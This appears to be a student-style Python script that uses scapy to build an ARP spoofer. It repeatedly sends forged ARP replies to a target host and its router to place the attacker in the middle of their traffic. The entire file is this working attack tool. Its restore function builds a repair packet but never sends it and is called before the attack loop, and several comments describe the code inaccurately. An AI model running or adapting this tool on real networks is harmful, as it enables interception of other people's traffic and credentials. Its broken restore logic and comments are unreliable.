#!/usr/bin/env python3

# Script Name:      ARP Spoofer
# Author:           Vincent Bailey
# Last Rev:         04/7/2023
# Purpose:          This script will act as an ARP spoofer.

##############################################################################
# Libraries
##############################################################################
import scapy.all as scapy
import sys, time


##############################################################################
# Global Variables
##############################################################################
sent_packets_count = 0


##############################################################################
# Spoof Function
##############################################################################
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)

    # Setting the line below to False will allow the script to run without
    # without displaying its output into the terminal. Keeps things clean.
    scapy.send(packet, verbose=False)


##############################################################################
# Scan Function
##############################################################################
def get_mac(ip):
    # This line searches for the IP address range on a network.
    arp_request = scapy.ARP(pdst=ip)
    # arp_request.show()  # shows packet details

    # This line searches for the MAC address field on a network.
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # broadcast.show()  # shows packet details

    # scapy allows us to append both of the variables above with the line below.
    arp_request_broadcast = broadcast / arp_request

    # this line will send and receive packets using scapy's "srp" method.
    # srp abbreviated for "send / receive packets"
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


##############################################################################
# Restore Function
##############################################################################
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip)


##############################################################################
# Main
##############################################################################
restore("insert target IP here", "insert target router here")
try:
    while True:
        spoof("insert target IP here", "insert router IP here")  # This spoofs the target
        spoof("insert router IP here", "insert target IP here")  # This spoofs the router
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent:" + str(sent_packets_count), end="")

        # the line below flushes the standard output, telling python to print any
        # statements to the same line; instead of printing to a new line.
        # sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] CTRL + C Pressed.....Quitting Application.")


##############################################################################
# End
##############################################################################
